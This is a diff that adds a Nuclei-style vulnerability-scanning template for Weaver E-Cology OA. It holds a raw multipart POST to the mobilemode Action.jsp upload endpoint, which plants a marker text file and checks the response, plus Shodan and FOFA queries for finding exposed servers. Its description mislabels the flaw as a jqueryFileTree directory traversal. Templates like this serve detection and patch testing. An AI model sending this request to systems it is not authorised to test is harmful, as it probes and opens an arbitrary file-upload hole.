@@ -1,0 +1,51 @@
+id: ecology-mobilemode-upload
+
+info:
+  name: ecology-mobilemode-upload
+  author: SleepingBag945
+  severity: medium
+  description: |
+    Panwei OA E-Cology jqueryFileTree.jsp directory traversal vulnerability.
+  reference:
+    - https://mp.weixin.qq.com/s/oVqzaUcp5j5MO_gzygK-Dg
+  classification:
+    cpe: cpe:2.3:a:weaver:e-cology:*:*:*:*:*:*:*:*
+  metadata:
+    verified: true
+    max-request: 1
+    vendor: weaver
+    product: e-cology
+    shodan-query: ecology_JSessionid
+    fofa-query: app="泛微-协同办公OA"
+  tags: ecology,upload,vuln
+
+http:
+  - raw:
+      - |
+        POST /mobilemode/Action.jsp?invoker=com.weaver.formmodel.mobile.ui.servlet.MobileAppUploadAction&action=image HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; SV1; QQDownload 732; .NET4.0C; .NET4.0E; SE 2.X MetaSr 1.0)
+        Content-Length: 152
+        Content-Type: multipart/form-data; boundary=---***
+        Accept-Encoding: gzip, deflate, br
+        Connection: close
+
+        -----***
+        Content-Disposition: form-data; name="upload"; filename="test.txt"
+        Content-Type: text/plain
+
+        yLHay4MIqQyZdrlOMFItwFc8xNBGtWLG
+        -----***--
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "url"
+          - ".txt"
+          - "state"
+        condition: and
+
+      - type: status
+        status:
+          - 200
+# digest: 4a0a0047304502206dd30d4ecd4b325d9f00be458f5df804673380f7ed129153ec73c1a52921484c022100f4e3babc6a9b46adefe83ec83c6f853da905d35adc6dbff27e8cba26b969060d:922c64590222798bb761d5b6d8e72950
